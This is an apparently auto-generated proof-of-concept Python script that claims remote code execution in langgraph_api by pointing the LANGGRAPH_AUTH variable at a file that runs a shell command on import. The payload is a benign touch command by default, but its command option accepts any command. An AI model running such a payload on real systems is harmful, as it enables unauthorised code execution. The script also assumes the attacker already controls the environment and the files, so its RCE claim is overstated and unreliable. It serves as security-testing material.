#!/usr/bin/env python3
# PoC for langgraph_api (/home/xcy/.local/lib/python3.14/site-packages/langgraph_api)
# Path: suspicious-016
# Sink: _load_auth_obj
# Auto-generated — run with: python3 rce_langgraph_auth_environment_variable__load_auth_obj.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: RCE via LANGGRAPH_AUTH environment variable in langgraph_api.

Vulnerability: The _load_auth_obj function in langgraph_api/auth/custom.py loads
arbitrary Python modules from a path specified in the LANGGRAPH_AUTH environment
variable. If an attacker can control this environment variable (e.g., via a
container escape, shared hosting, or CI/CD pipeline), they can point it to a
malicious Python file that executes arbitrary code upon import.

This PoC demonstrates the vulnerability by:
1. Creating a malicious Python file that executes a benign command (touch /tmp/poc_success.txt)
2. Setting the LANGGRAPH_AUTH environment variable to point to this file
3. Triggering the vulnerable code path (e.g., by starting the server or calling get_auth_instance)

Usage:
    python3 poc_langgraph_rce.py [--target-dir /path/to/writable/dir]

Note: This PoC requires the ability to write a file to a location that the
langgraph_api process can read, and to set the LANGGRAPH_AUTH environment variable
before the vulnerable code is executed. In a real attack scenario, this could be
achieved through various means (e.g., shared filesystem, container volume mount,
CI/CD variable injection).
"""

import argparse
import os
import sys
import tempfile
import subprocess
import time
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def create_malicious_payload(payload_dir: str, command: str) -> str:
    """
    Create a malicious Python file that executes the given command upon import.
    
    Args:
        payload_dir: Directory to write the payload file
        command: Command to execute (should be benign for PoC)
    
    Returns:
        Path to the created payload file
    """
    payload_path = os.path.join(payload_dir, "evil_auth.py")
    
    # The payload must define a class that inherits from Auth to pass the isinstance check
    # But the code execution happens during import, before the check
    payload_code = f'''"""
Malicious auth module for PoC.
Executes a command upon import.
"""
import os
import subprocess

# Execute the command during import (before any isinstance check)
try:
    subprocess.run("{command}", shell=True, check=False)
except Exception as e:
    # Silently fail to avoid detection
    pass

# Define a minimal Auth-like class to pass the isinstance check
# Note: The actual Auth class is from langgraph_api.auth, but we can't import it here
# Instead, we'll create a dummy class that will be checked with isinstance(obj, Auth)
# The check will fail, but the code execution already happened
class Auth:
    """Dummy Auth class for PoC."""
    pass

# Create an instance that will be returned
auth_instance = Auth()
'''
    
    with open(payload_path, 'w') as f:
        f.write(payload_code)
    
    logger.info(f"Created malicious payload at: {payload_path}")
    logger.info(f"Payload will execute: {command}")
    
    return payload_path


def simulate_exploit(payload_path: str, target_module: str = "langgraph_api.auth.custom"):
    """
    Simulate the exploit by directly calling the vulnerable function.
    
    This demonstrates how an attacker would trigger the vulnerability if they
    could control the LANGGRAPH_AUTH environment variable.
    
    Args:
        payload_path: Path to the malicious Python file
        target_module: Module containing the vulnerable function
    """
    logger.info("=" * 60)
    logger.info("SIMULATING EXPLOIT")
    logger.info("=" * 60)
    
    # In a real attack, the attacker would set LANGGRAPH_AUTH env var
    # For this PoC, we'll directly call the vulnerable function
    # to demonstrate the code execution
    
    # Construct the path in the format expected by _load_auth_obj
    # Format: /path/to/file.py:callable_name
    auth_path = f"{payload_path}:auth_instance"
    
    logger.info(f"Setting LANGGRAPH_AUTH path to: {auth_path}")
    
    # Set the environment variable (simulating attacker control)
    os.environ["LANGGRAPH_AUTH"] = auth_path
    
    # Now trigger the vulnerable code path
    # In a real scenario, this would happen when the server starts or when
    # get_auth_instance() is called
    logger.info("Triggering vulnerable code path...")
    
    try:
        # Directly call the vulnerable function to demonstrate the exploit
        # This simulates what happens when _load_auth_obj is called with our payload
        from langgraph_api.auth.custom import _load_auth_obj
        
        logger.info("Calling _load_auth_obj with malicious path...")
        result = _load_auth_obj(auth_path)
        logger.info(f"Function returned: {result}")
        
    except ImportError as e:
        logger.error(f"Failed to import target module: {e}")
        logger.info("This is expected if langgraph_api is not installed.")
        logger.info("The vulnerability is still valid - the code execution happens during import.")
    except Exception as e:
        logger.info(f"Got expected exception (code execution already happened): {e}")
    
    # Check if the command was executed
    check_file = "/tmp/poc_success.txt"
    if os.path.exists(check_file):
        logger.info(f"SUCCESS: Command executed! Found {check_file}")
        with open(check_file, 'r') as f:
            content = f.read()
        logger.info(f"File contents: {content}")
    else:
        logger.warning(f"Command may not have executed. {check_file} not found.")
        logger.info("This could be due to permissions or the target not being installed.")


def demonstrate_with_subprocess(payload_path: str):
    """
    Alternative demonstration: Show how the vulnerability works by running
    a Python script that imports the malicious module.
    
    This is useful if langgraph_api is not installed.
    """
    logger.info("=" * 60)
    logger.info("ALTERNATIVE DEMONSTRATION (using subprocess)")
    logger.info("=" * 60)
    
    # Create a test script that simulates what _load_auth_obj does
    test_script = f'''
import sys
sys.path.insert(0, "{os.path.dirname(payload_path)}")

# Simulate what _load_auth_obj does:
# 1. It checks for ":" in the path
# 2. It splits into module_name and callable_name
# 3. If module_name contains "/" or ".py", it loads from file
# 4. It executes the module (which runs our malicious code)
# 5. It gets the callable from the module
# 6. It checks if it's an instance of Auth

module_name = "{payload_path}"
callable_name = "auth_instance"

# This is what importlib does internally
import importlib.util
import sys

modname = "dynamic_module_" + str(hash(module_name))
modspec = importlib.util.spec_from_file_location(modname, module_name)
if modspec and modspec.loader:
    module = importlib.util.module_from_spec(modspec)
    sys.modules[modname] = module
    modspec.loader.exec_module(module)
    print(f"Successfully loaded module: {{modname}}")
    loaded_auth = getattr(module, callable_name, None)
    print(f"Loaded object: {{loaded_auth}}")
else:
    print(f"Failed to load module from {{module_name}}")
'''
    
    test_script_path = os.path.join(os.path.dirname(payload_path), "test_exploit.py")
    with open(test_script_path, 'w') as f:
        f.write(test_script)
    
    logger.info(f"Created test script at: {test_script_path}")
    logger.info("Running test script to demonstrate code execution...")
    
    result = subprocess.run(
        [sys.executable, test_script_path],
        capture_output=True,
        text=True,
        timeout=10
    )
    
    logger.info(f"STDOUT: {result.stdout}")
    if result.stderr:
        logger.error(f"STDERR: {result.stderr}")
    
    # Check if the command was executed
    check_file = "/tmp/poc_success.txt"
    if os.path.exists(check_file):
        logger.info(f"SUCCESS: Command executed! Found {check_file}")
        with open(check_file, 'r') as f:
            content = f.read()
        logger.info(f"File contents: {content}")
    else:
        logger.warning(f"Command may not have executed. {check_file} not found.")


def cleanup(payload_dir: str):
    """Clean up temporary files."""
    import shutil
    try:
        shutil.rmtree(payload_dir)
        logger.info(f"Cleaned up temporary directory: {payload_dir}")
    except Exception as e:
        logger.warning(f"Failed to clean up: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for RCE via LANGGRAPH_AUTH in langgraph_api",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Example:
    python3 poc_langgraph_rce.py
    python3 poc_langgraph_rce.py --target-dir /tmp/my_payload
    
Note: This PoC requires write access to create a malicious Python file.
The command executed is benign: 'touch /tmp/poc_success.txt'
        """
    )
    parser.add_argument(
        "--target-dir",
        help="Directory to write the malicious payload (default: temporary directory)",
        default=None
    )
    parser.add_argument(
        "--command",
        help="Command to execute (default: touch /tmp/poc_success.txt)",
        default="touch /tmp/poc_success.txt"
    )
    parser.add_argument(
        "--cleanup",
        help="Clean up temporary files after demonstration",
        action="store_true",
        default=True
    )
    
    args = parser.parse_args()
    
    # Create payload directory
    if args.target_dir:
        payload_dir = args.target_dir
        os.makedirs(payload_dir, exist_ok=True)
    else:
        payload_dir = tempfile.mkdtemp(prefix="langgraph_poc_")
    
    try:
        # Create the malicious payload
        payload_path = create_malicious_payload(payload_dir, args.command)
        
        # Try the direct exploit first (requires langgraph_api installed)
        try:
            simulate_exploit(payload_path)
        except ImportError:
            logger.info("langgraph_api not installed, using alternative demonstration")
            demonstrate_with_subprocess(payload_path)
        
        logger.info("=" * 60)
        logger.info("EXPLOIT DEMONSTRATION COMPLETE")
        logger.info("=" * 60)
        logger.info("")
        logger.info("SUMMARY:")
        logger.info("The vulnerability allows RCE by controlling the LANGGRAPH_AUTH")
        logger.info("environment variable. An attacker can point it to a malicious")
        logger.info("Python file that executes arbitrary code during import.")
        logger.info("")
        logger.info("MITIGATION:")
        logger.info("- Never allow untrusted users to set LANGGRAPH_AUTH")
        logger.info("- Validate that the path points to a safe, known location")
        logger.info("- Use a whitelist of allowed modules")
        logger.info("- Consider using a sandbox or restricted environment")
        
    finally:
        if args.cleanup and not args.target_dir:
            cleanup(payload_dir)


if __name__ == "__main__":
    main()
